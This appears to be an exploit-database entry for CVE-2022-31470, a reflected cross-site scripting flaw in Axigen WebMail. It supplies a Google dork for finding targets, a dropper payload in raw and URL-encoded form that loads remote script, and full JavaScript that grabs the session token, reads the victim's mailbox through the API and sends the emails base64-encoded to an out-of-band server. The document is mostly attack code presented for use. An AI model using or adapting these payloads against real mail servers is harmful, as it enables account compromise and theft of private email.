@@ -1,0 +1,87 @@
+id: 39051
+date: 09/11/2023
+title: Axigen < 10.3.3.47, 10.2.3.12 - Reflected XSS Vulnerability
+author: AmirZargham
+cves: CVE-2022-31470
+
+# Exploit Title: Axigen < 10.3.3.47, 10.2.3.12 - Reflected XSS
+# Google Dork: inurl:passwordexpired=yes
+# Exploit Author: AmirZargham
+# Vendor Homepage: https://www.axigen.com/
+# Software Link: https://www.axigen.com/mail-server/download/
+# Version: (10.5.0–4370c946) and older version of Axigen WebMail
+# Tested on: firefox,chrome
+# CVE: CVE-2022-31470
+
+Exploit
+We use the second Reflected XSS to exploit this vulnerability, create a
+malicious link, and steal user emails.
+
+Dropper code
+This dropper code, loads and executes JavaScript exploit code from a remote
+server.
+
+');
+x = document.createElement('script');
+x.src = 'https://example.com/exploit.js';
+window.addEventListener('DOMContentLoaded',function y(){
+  document.body.appendChild(x)
+})//
+
+
+
+Encoded form
+
+/index.hsp?m=%27)%3Bx%3Ddocument.createElement(%27script%27)%3Bx.src%3D%27
+https://example.com/exploit.js%27%3Bwindow.addEventListener(%27DOMContentLoaded%27,function+y(){document.body.appendChild(x)})//
+
+
+Exploit code
+
+xhr1 = new XMLHttpRequest(), xhr2 = new XMLHttpRequest(), xhr3 = new
+XMLHttpRequest();
+oob_server = 'https://example.com/';
+var script_tag = document.createElement('script');
+
+xhr1.open('GET', '/', true);
+xhr1.onreadystatechange = () => {
+    if (xhr1.readyState === XMLHttpRequest.DONE) {
+        _h_cookie = new URL(xhr1.responseURL).search.split("=")[1];
+        xhr2.open('PATCH', `/api/v1/conversations/MQ/?_h=${_h_cookie}`,
+true);
+        xhr2.setRequestHeader('Content-Type', 'application/json');
+        xhr2.onreadystatechange = () => {
+            if (xhr2.readyState === XMLHttpRequest.DONE) {
+                if (xhr2.status === 401){
+                    script_tag.src =
+`${oob_server}?status=session_expired&domain=${document.domain}`;
+                    document.body.appendChild(script_tag);
+                } else {
+                    resp = xhr2.responseText;
+                    folderId = JSON.parse(resp)["mails"][0]["folderId"];
+                    xhr3.open('GET',
+`/api/v1/conversations?folderId=${folderId}&_h=${_h_cookie}`, true);
+                    xhr3.onreadystatechange = () => {
+                        if (xhr3.readyState === XMLHttpRequest.DONE) {
+                            emails = xhr3.responseText;
+                            script_tag.src =
+`${oob_server}?status=ok&domain=${document.domain}&emails=${btoa(emails)}`;
+                            document.body.appendChild(script_tag);
+                        }
+                    };
+                    xhr3.send();
+                }
+            }
+        };
+        var body = JSON.stringify({isUnread: false});
+        xhr2.send(body);
+    }
+};
+xhr1.send();
+
+
+Combining dropper and exploit
+You can host the exploit code somewhere and then address it in the dropper
+code.
+
+#  0day.today [2023-09-14]  #
